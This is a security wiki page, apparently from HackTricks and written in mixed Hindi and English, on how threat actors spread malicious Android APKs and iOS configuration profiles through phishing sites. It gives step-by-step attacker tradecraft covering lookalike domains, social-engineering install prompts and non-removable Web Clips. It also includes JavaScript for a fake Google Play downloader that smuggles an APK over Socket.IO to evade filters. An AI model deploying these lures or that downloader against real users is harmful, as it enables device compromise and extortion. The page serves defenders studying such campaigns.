# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज phishing (SEO, social engineering, fake stores, dating apps आदि) के ज़रिए **malicious Android APKs** और **iOS mobile-configuration profiles** वितरित करने के लिए threat actors द्वारा इस्तेमाल की जाने वाली तकनीकों को कवर करता है।
> यह सामग्री Zimperium zLabs (2025) द्वारा उजागर की गई SarangTrap campaign और अन्य सार्वजनिक research से अनुकूलित है।<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
   * मिलते-जुलते नाम वाले दर्जनों domains (dating, cloud share, car service…) register करें।  
     – Google में rank करने के लिए `<title>` element में स्थानीय भाषा के keywords और emojis इस्तेमाल करें।  
     – एक ही landing page पर Android (`.apk`) और iOS install instructions, दोनों होस्ट करें।
2. **First Stage Download**
   * Android: *unsigned* या “third-party store” APK का direct link।  
   * iOS: malicious **mobileconfig** profile का `itms-services://` या सादा HTTPS link (नीचे देखें)।
3. **Android Post-install Behaviour**
   * C2-gated execution, permission abuse, dropper bypasses, background collection और अन्य post-install malware behaviour को नीचे दिए गए dedicated Android Malware Post-Exploitation पेज में कवर किया गया है।
4. **iOS Delivery Technique**
   * एक **mobile-configuration profile** डिवाइस को “MDM”-जैसी supervision में enroll करने के लिए `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि का अनुरोध कर सकता है।  
   * Social-engineering instructions:
     1. Settings खोलें ➜ *Profile downloaded*।
     2. *Install* पर तीन बार tap करें (phishing page पर screenshots)।  
     3. Unsigned profile पर भरोसा करें ➜ attacker को App Store review के बिना *Contacts* और *Photo* entitlements मिल जाते हैं।
5. **iOS Web Clip Payload (phishing app icon)**
   * `com.apple.webClip.managed` payloads एक phishing URL को branded icon/label के साथ **Home Screen पर pin** कर सकते हैं।
   * Web Clips **full-screen** चल सकते हैं (browser UI छिपाते हैं) और उन्हें **non-removable** के रूप में चिह्नित किया जा सकता है, जिससे icon हटाने के लिए victim को profile delete करना पड़ता है।<sup>[[3]](#references)</sup>
6. **Network Layer**
   * सादा HTTP, अक्सर port 80 पर, `api.<phishingdomain>.com` जैसे HOST header के साथ।
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS नहीं → आसानी से पता लगाया जा सकता है)।

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS और persistence जैसी post-install Android malware tradecraft के लिए देखें:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers तेजी से static APK links की जगह Google Play जैसे दिखने वाले lures में embed किए गए Socket.IO/WebSocket channel का इस्तेमाल कर रहे हैं। इससे payload URL छिप जाता है, URL/extension filters bypass हो जाते हैं और install का अनुभव वास्तविक लगता है।<sup>[[2]](#references)[[4]](#references)</sup>

वास्तविक घटनाओं में देखा गया सामान्य client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

यह आसान नियंत्रणों से कैसे बच निकलता है:
- कोई स्थिर APK URL उजागर नहीं होता; WebSocket frames से payload को मेमोरी में फिर से बनाया जाता है।
- सीधे .apk responses को block करने वाले URL/MIME/extension filters, WebSockets/Socket.IO के ज़रिए tunnel किए गए binary data को शायद पहचान न पाएं।
- WebSockets execute न करने वाले crawlers और URL sandboxes payload प्राप्त नहीं कर पाएंगे।

WebSocket tradecraft और tooling भी देखें:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [रोमांस का काला पक्ष: SarangTrap जबरन वसूली अभियान](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple डिवाइसेज़ के लिए Web Clips payload सेटिंग्स](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [इंडोनेशियाई और वियतनामी Android उपयोगकर्ताओं को निशाना बनाने वाला Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
